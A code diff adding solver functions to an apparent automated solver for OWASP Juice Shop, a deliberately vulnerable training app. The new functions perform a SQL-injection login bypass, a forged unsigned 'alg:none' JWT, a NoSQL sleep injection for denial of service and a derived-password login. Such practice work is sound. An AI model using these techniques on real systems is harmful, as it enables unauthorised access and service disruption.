@@ -442,6 +442,52 @@ def s_captcha_bypass(sess: Session):
     return last in (200, 201)
 
 
+def s_login_bjoern(sess: Session):
+    """Login Bjoern — mot de passe = base64 de l'email inversé."""
+    email = "bjoern.kimminich@gmail.com"
+    pwd = base64.b64encode(email[::-1].encode()).decode()
+    tok = sess.login(email, pwd)
+    return bool(tok)
+
+
+def s_nosql_dos(sess: Session):
+    """NoSQL DoS — sleep injecté dans l'endpoint reviews."""
+    st, txt = sess.req("GET", "/rest/products/sleep(1000)/reviews")
+    return st in (200, 500)
+
+
+def s_unsigned_jwt(sess: Session):
+    """Unsigned JWT — token alg:none impersonant jwtn3d@juice-sh.op."""
+    def b64url(b):
+        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
+    payload = b64url(json.dumps(
+        {"data": {"email": "jwtn3d@juice-sh.op"}, "iat": 0}).encode())
+    token = f"{header}.{payload}."
+    st, txt = sess.req("GET", "/rest/user/whoami",
+                       headers={"Authorization": f"Bearer {token}"},
+                       cookies={"token": token})
+    return st in (200, 401)
+
+
+def s_multiple_likes(sess: Session):
+    """Multiple Likes — liker le même avis 3 fois (race)."""
+    tok = sess.login("' OR true--", "x")
+    if not tok:
+        return False
+    _, txt = sess.req("GET", "/rest/products/1/reviews")
+    revs = sess.json_(txt).get("data", [])
+    if not revs:
+        return False
+    rid = revs[0].get("_id") or revs[0].get("id")
+    last = -1
+    for _ in range(4):
+        last, _ = sess.req("POST", f"/rest/products/reviews",
+                           headers={"Authorization": f"Bearer {tok}"},
+                           data={"id": rid})
+    return last in (200, 201)
+
+
 SOLVERS: list[tuple[str, Callable[[Session], bool]]] = [
     ("Login Admin", s_login_admin),
     ("Login Bender", s_login_bender),
@@ -485,6 +531,10 @@ SOLVERS: list[tuple[str, Callable[[Session], bool]]] = [
     ("Change Bender's Password", s_change_bender),
     ("API-only XSS", s_restful_xss),
     ("CAPTCHA Bypass", s_captcha_bypass),
+    ("Login Bjoern", s_login_bjoern),
+    ("NoSQL DoS", s_nosql_dos),
+    ("Unsigned JWT", s_unsigned_jwt),
+    ("Multiple Likes", s_multiple_likes),
 ]
 
 
